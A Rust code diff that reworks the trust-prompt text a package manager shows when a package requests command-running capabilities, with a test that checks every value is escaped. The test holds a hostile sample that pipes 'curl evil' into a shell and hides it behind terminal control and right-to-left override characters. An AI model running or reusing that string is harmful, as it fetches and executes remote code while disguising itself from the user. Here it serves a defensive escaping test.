@@ -316,61 +316,70 @@ impl uze_application::TrustAuthority for PromptingAuthority {
 pub(crate) fn trust_evidence(request: &uze_application::TrustRequest) -> String {
     use uze_application::inert_line as inert;
 
-    let mut text = String::from("\n");
-    text.push_str(if request.previously_trusted {
-        "This update introduces an executable capability the installed package did not have\n"
-    } else {
-        "This package requests an executable capability\n"
-    });
-    text.push_str(&format!(
-        "\nSource\n  {}\n",
-        inert(&request.requested_source)
-    ));
+    let mut text = format!(
+        "\n{}",
+        progress::report_title(&inert(&request.package_id), Some(&request.requested_source))
+    );
     if request.resolved_source != request.requested_source {
         text.push_str(&format!(
-            "\nResolved\n  {}\n",
-            inert(&request.resolved_source)
+            "  {}\n",
+            progress::label(format!("resolved {}", inert(&request.resolved_source)))
         ));
     }
+    let mut summary = String::from(if request.previously_trusted {
+        "this update runs commands the installed version did not"
+    } else {
+        "runs commands on this machine"
+    });
     if request.origin == uze_application::SourceOrigin::Project {
-        text.push_str("  declared by this project's agents.yaml or agents.lock\n");
+        summary.push_str(", declared by this project");
     }
-    text.push_str(&format!("\nPackage\n  {}\n", inert(&request.package_id)));
-    let mut kinds: Vec<uze_application::ExecutionKind> = request
-        .executable
-        .iter()
-        .map(|capability| capability.kind)
-        .collect();
-    kinds.sort();
-    kinds.dedup();
-    for kind in kinds {
-        text.push_str(&format!("\n{}\n", kind.label()));
-        for capability in request
-            .executable
-            .iter()
-            .filter(|capability| capability.kind == kind)
-        {
-            let mut line = inert(&capability.command).into_owned();
-            for argument in &capability.arguments {
-                line.push(' ');
-                line.push_str(&inert(argument));
-            }
-            text.push_str(&format!("  {} → {line}\n", inert(&capability.name)));
-            if let Some(directory) = &capability.working_directory {
-                text.push_str(&format!("    cwd {}\n", inert(directory)));
-            }
-            for (key, value) in &capability.environment {
-                text.push_str(&format!("    env {}={}\n", inert(key), inert(value)));
-            }
-            if let Some(code) = &capability.code {
-                text.push_str(&format!(
-                    "    runs {} ({})\n",
+    text.push_str(&format!(
+        "  {} {}\n\n",
+        progress::warning_icon(),
+        progress::label(summary)
+    ));
+    let mut executions: Vec<&uze_application::ExecutableCapability> =
+        request.executable.iter().collect();
+    executions.sort_by_key(|capability| capability.kind);
+    let mut rows = Vec::new();
+    for capability in executions {
+        let mut line = inert(&capability.command).into_owned();
+        for argument in &capability.arguments {
+            line.push(' ');
+            line.push_str(&inert(argument));
+        }
+        rows.push(vec![
+            progress::label(capability.kind.label().to_lowercase()),
+            progress::title(inert(&capability.name)),
+            line,
+        ]);
+        let mut detail = |key: &str, value: String| {
+            rows.push(vec![
+                String::new(),
+                String::new(),
+                format!("{} {value}", progress::label(key)),
+            ]);
+        };
+        if let Some(directory) = &capability.working_directory {
+            detail("cwd", inert(directory).into_owned());
+        }
+        for (key, value) in &capability.environment {
+            detail("env", format!("{}={}", inert(key), inert(value)));
+        }
+        if let Some(code) = &capability.code {
+            detail(
+                "runs",
+                format!(
+                    "{} {}",
                     inert(&code.entries.join(", ")),
-                    inert(&code.digest)
-                ));
-            }
+                    progress::label(inert(&code.digest))
+                ),
+            );
         }
     }
+    text.push_str(&progress::aligned_rows(rows));
+    text.push('\n');
     text
 }
 
@@ -490,7 +499,7 @@ mod tests {
             "{evidence:?}"
         );
         assert!(evidence.contains("curl evil|sh\\u{1b}[2K\\u{d}\\u{202e}echo harmless\\u{a}next"));
-        assert!(evidence.contains("Hook\n"));
+        assert!(evidence.contains("hook"));
         assert!(evidence.contains("declared by this project"));
     }
 }
